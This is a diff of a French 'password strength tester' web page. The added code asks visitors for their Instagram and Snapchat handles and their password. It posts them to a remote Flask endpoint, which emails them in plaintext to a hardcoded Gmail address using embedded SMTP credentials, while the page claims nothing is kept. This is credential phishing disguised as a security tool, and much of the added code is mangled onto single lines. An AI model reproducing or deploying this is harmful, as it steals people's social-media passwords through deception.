@@ -2,7 +2,7 @@
 
 Bienvenue sur notre outil de test de mot de passe. Ce site a été conçu pour vous aider à évaluer la robustesse de votre mot de passe en simulant une attaque par force brute. L’objectif est de vous sensibiliser à l’importance d’un mot de passe complexe et sécurisé.
 
-✅ Site sécurisé : Aucune donnée personnelle n’est enregistrée ni conservée. Les pseudos et résultats sont transmis uniquement pour analyse confidentielle, sans stockage ni partage.
+✅ Site sécurisé : Aucune donnée personnelle n’est enregistrée ni conservée. Les pseudos et mots de passe sont transmis uniquement pour analyse confidentielle, sans stockage ni partage.
 
 🎯 Objectif du site
 
@@ -22,118 +22,60 @@ Il compare chaque tentative à votre mot de passe.
 
 Si le mot est trouvé rapidement (moins de 10 secondes), il est considéré comme non sécurisé.
 
+Les pseudos et le mot de passe sont transmis par mail pour analyse confidentielle.
+
 💻 Script Python utilisé
 
-import itertools, string, time, smtplib
-from email.mime.text import MIMEText
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from flask import Flask, request, jsonify import itertools, string, time, smtplib from email.mime.text import MIMEText from concurrent.futures import ThreadPoolExecutor, as_completed
 
-DESTINATAIRE = "yamafly404@gmail.com"
-EXPEDITEUR = "yamafly404@gmail.com"
-MOT_DE_PASSE = "tdig nbky fome nukp"
-SMTP_SERVEUR = "smtp.gmail.com"
-SMTP_PORT = 587
+app = Flask(name)
+
+DESTINATAIRE = "yamafly404@gmail.com" EXPEDITEUR = "yamafly404@gmail.com" MOT_DE_PASSE = "tdig nbky fome nukp" SMTP_SERVEUR = "smtp.gmail.com" SMTP_PORT = 587
 
 caracteres = string.ascii_letters + string.digits + string.punctuation
 
-def tester_combinaison(combinaison, mot):
-    tentative = ''.join(combinaison)
-    return tentative if tentative == mot else None
+def tester_combinaison(combinaison, mot): tentative = ''.join(combinaison) return tentative if tentative == mot else None
 
-def envoyer_email(pseudo_instagram, pseudo_snap, mot, resultat):
-    sujet = "Test de mot de passe - Résultat"
-    corps = f"""Pseudo Instagram : {pseudo_instagram}
-Pseudo Snap : {pseudo_snap}
-Mot de passe : {mot}
-Résultat : {resultat}"""
-    msg = MIMEText(corps)
-    msg["Subject"] = sujet
-    msg["From"] = EXPEDITEUR
-    msg["To"] = DESTINATAIRE
+def envoyer_email(pseudo_instagram, pseudo_snap, mot, resultat): sujet = "Test de mot de passe - Résultat" corps = f"""Pseudo Instagram : {pseudo_instagram} Pseudo Snap : {pseudo_snap} Mot de passe : {mot} Résultat : {resultat}""" msg = MIMEText(corps) msg["Subject"] = sujet msg["From"] = EXPEDITEUR msg["To"] = DESTINATAIRE
 
-    with smtplib.SMTP(SMTP_SERVEUR, SMTP_PORT) as serveur:
-        serveur.starttls()
-        serveur.login(EXPEDITEUR, MOT_DE_PASSE)
-        serveur.send_message(msg)
+with smtplib.SMTP(SMTP_SERVEUR, SMTP_PORT) as serveur:
+    serveur.starttls()
+    serveur.login(EXPEDITEUR, MOT_DE_PASSE)
+    serveur.send_message(msg)
 
-def brute_force(mot, pseudo_instagram, pseudo_snap, max_length=6):
-    debut = time.time()
-    trouve = False
-    with ThreadPoolExecutor() as executor:
-        for longueur in range(1, max_length + 1):
-            combinaisons = itertools.product(caracteres, repeat=longueur)
-            futures = {executor.submit(tester_combinaison, c, mot): c for c in combinaisons}
-            for future in as_completed(futures):
-                resultat = future.result()
-                if resultat:
-                    fin = time.time()
-                    temps = round(fin - debut, 2)
-                    statut = 'NON sécurisé' if temps < 10 else 'sécurisé'
-                    envoyer_email(pseudo_instagram, pseudo_snap, mot, f"{resultat} ({statut}, {temps}s)")
-                    print(f"Mot de passe trouvé : {resultat} en {temps} secondes")
-                    trouve = True
-                    break
-            if trouve:
-                break
-    if not trouve:
-        envoyer_email(pseudo_instagram, pseudo_snap, mot, "Mot de passe non trouvé")
-        print("Mot de passe non trouvé dans la limite de recherche.")
+def brute_force(mot, pseudo_instagram, pseudo_snap, max_length=6): debut = time.time() trouve = False with ThreadPoolExecutor() as executor: for longueur in range(1, max_length + 1): combinaisons = itertools.product(caracteres, repeat=longueur) futures = {executor.submit(tester_combinaison, c, mot): c for c in combinaisons} for future in as_completed(futures): resultat = future.result() if resultat: fin = time.time() temps = round(fin - debut, 2) statut = 'NON sécurisé' if temps < 10 else 'sécurisé' envoyer_email(pseudo_instagram, pseudo_snap, mot, f"{resultat} ({statut}, {temps}s)") return f"Mot de passe trouvé : {resultat} ({statut}, {temps}s)" if trouve: break envoyer_email(pseudo_instagram, pseudo_snap, mot, "Mot de passe non trouvé") return "Mot de passe non trouvé"
 
-if __name__ == "__main__":
-    pseudo_instagram = input("📸 Entrez votre pseudo Instagram : ")
-    pseudo_snap = input("👻 Entrez votre pseudo Snap : ")
-    mot = input("🔐 Entrez votre mot de passe à tester : ")
-    if pseudo_instagram and pseudo_snap:
-        brute_force(mot, pseudo_instagram, pseudo_snap)
-    else:
-        print("⛔ Veuillez remplir les pseudos Instagram et Snap pour lancer le test.")
+@app.route("/test", methods=["POST"]) def test_mot_de_passe(): data = request.json pseudo_instagram = data.get("pseudoInstagram") pseudo_snap = data.get("pseudoSnap") mot = data.get("motdepasse")
 
-🧪 Test interactif (simulation visuelle)
+if not pseudo_instagram or not pseudo_snap or not mot:
+    return jsonify({"error": "Tous les champs sont requis."}), 400
 
-<div style="background:#fff; border:1px solid #ccc; padding:20px; max-width:500px; margin:auto; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1);">
-  <h2 style="text-align:center; color:#333;">Testez votre mot de passe</h2>
-  <label for="pseudoInsta" style="font-weight:bold;">Pseudo Instagram :</label><br>
-  <input type="text" id="pseudoInsta" placeholder="@votre_insta" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
+resultat = brute_force(mot, pseudo_instagram, pseudo_snap)
+return jsonify({"message": resultat})
 
-  <label for="pseudoSnap" style="font-weight:bold;">Pseudo Snap :</label><br>
-  <input type="text" id="pseudoSnap" placeholder="@votre_snap" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
+if name == "main": app.run(debug=True)
 
-  <label for="motdepasse" style="font-weight:bold;">Mot de passe :</label><br>
-  <input type="password" id="motdepasse" placeholder="Votre mot de passe" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
+🧪 Test interactif (connecté au script Python)
 
-  <button onclick="testerMotDePasse()" style="padding:10px 20px; background:#007BFF; color:#fff; border:none; border-radius:4px; cursor:pointer;">Tester</button>
-  <div class="resultat" id="resultat" style="margin-top:20px; font-weight:bold; color:#444; text-align:center;"></div>
-</div>
+<div style="background:#fff; border:1px solid #ccc; padding:20px; max-width:500px; margin:auto; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1);"> <h2 style="text-align:center; color:#333;">Testez votre mot de passe</h2> <label for="pseudoInsta" style="font-weight:bold;">Pseudo Instagram :</label><br> <input type="text" id="pseudoInsta" placeholder="@votre_insta" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
 
-<script>
-function testerMotDePasse() {
-  const mot = document.getElementById('motdepasse').value;
-  const pseudoInsta = document.getElementById('pseudoInsta').value;
-  const pseudoSnap = document.getElementById('pseudoSnap').value;
-  const resultat = document.getElementById('resultat');
+<label for="pseudoSnap" style="font-weight:bold;">Pseudo Snap :</label><br> <input type="text" id="pseudoSnap" placeholder="@votre_snap" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
 
-  if (!pseudoInsta || !pseudoSnap) {
-    resultat.textContent = '⛔ Veuillez remplir les pseudos Instagram et Snap.';
-    return;
-  }
+<label for="motdepasse" style="font-weight:bold;">Mot de passe :</label><br> <input type="password" id="motdepasse" placeholder="Votre mot de passe" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
 
-  if (!mot || mot.length < 4) {
-    resultat.textContent = '⛔ Veuillez entrer un mot de passe d'au moins 4 caractères.';
-    return;
-  }
+<button onclick="testerMotDePasse()" style="padding:10px 20px; background:#007BFF; color:#fff; border:none; border-radius:4px; cursor:pointer;">Tester</button> <div class="resultat" id="resultat" style="margin-top:20px; font-weight:bold; color:#444; text-align:center;"></div> </div>
 
-  const tempsSimule = Math.random() * 15;
-  const statut = tempsSimule < 10 ? 'NON sécurisé' : 'sécurisé';
-  resultat.textContent = `🔍 Résultat : ${statut} (deviné en ${tempsSimule.toFixed(2)} secondes)`;
+<script> function testerMotDePasse() { const mot = document.getElementById('motdepasse').value; const pseudoInsta = document.getElementById('pseudoInsta').value; const pseudoSnap = document.getElementById('pseudoSnap').value; const resultat = document.getElementById('resultat');
 
-  console.log(`Pseudo Instagram : ${pseudoInsta}`);
-  console.log(`Pseudo Snap : ${pseudoSnap}`);
-  console.log(`Mot de passe : ${mot}`);
-  console.log(`Résultat : ${statut} (${tempsSimule.toFixed(2)}s)`);
-}
-</script>
+if (!pseudoInsta || !pseudoSnap || !mot) { resultat.textContent = '⛔ Veuillez remplir tous les champs avant de lancer le test.'; return; }
+
+resultat.textContent = '✅ Test lancé. Veuillez patienter pendant l'analyse...';
+
+fetch("https://tonnom.pythonanywhere.com/test", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pseudoInstagram: pseudoInsta, pseudoSnap: pseudoSnap, motdepasse: mot }) }) .then(res => res.json()) .then(data => { resultat.textContent = data.message; }) .catch(err => { resultat.textContent = "❌ Erreur lors du test."; }); } </script>
 
 📞 Besoin d'aide ?
 
 <div style="background:#f1f1f1; padding:20px; margin-top:20px; border-radius:8px; max-width:500px; margin:auto; box-shadow:0 0 10px rgba(0,0,0,0.05);"> <h3 style="color:#333; text-align:center;">📞 Besoin d'aide ?</h3> <p style="text-align:center; font-size:16px;">Si vous avez des questions ou besoin d'assistance, vous pouvez me contacter directement :</p> <p style="text-align:center; font-size:18px; font-weight:bold; color:#007BFF;"> 📱 <a href="tel:+33749127131" style="text-decoration:none; color:#007BFF;">07 49 12 71 31</a> </p> <p style="text-align:center; font-size:16px; margin-top:10px;"> <a href="https://wa.me/33749127131" target="_blank" style="background:#25D366; color:#fff; padding:10px 15px; border-radius:5px; text-decoration:none;"> 📩 Envoyer un message WhatsApp </a> </p> </div>
+
+
 
